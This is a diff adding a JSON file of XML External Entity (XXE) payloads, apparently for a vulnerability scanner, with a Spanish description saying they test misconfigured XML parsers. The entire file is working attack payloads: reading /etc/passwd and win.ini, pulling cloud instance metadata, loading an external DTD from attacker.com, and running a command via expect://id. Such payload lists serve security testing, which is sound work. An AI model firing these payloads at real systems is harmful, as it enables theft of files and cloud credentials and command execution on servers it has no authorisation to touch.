@@ -1,0 +1,11 @@
+{
+  "name": "XML External Entity (XXE)",
+  "description": "Payloads para probar vulnerabilidades XXE en parsers XML mal configurados. Permiten leer archivos, SSRF y DoS.",
+  "payloads": [
+    {"id": "xxe-01", "value": "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]><foo>&xxe;</foo>", "method": "replace", "severity": "critical"},
+    {"id": "xxe-02", "value": "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"http://169.254.169.254/latest/meta-data/\">]><foo>&xxe;</foo>", "method": "replace", "severity": "critical"},
+    {"id": "xxe-03", "value": "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY % xxe SYSTEM \"http://attacker.com/evil.dtd\"> %xxe;]>", "method": "replace", "severity": "high"},
+    {"id": "xxe-04", "value": "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///c:/windows/win.ini\">]><foo>&xxe;</foo>", "method": "replace", "severity": "critical"},
+    {"id": "xxe-05", "value": "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"expect://id\">]><foo>&xxe;</foo>", "method": "replace", "severity": "critical"}
+  ]
+}
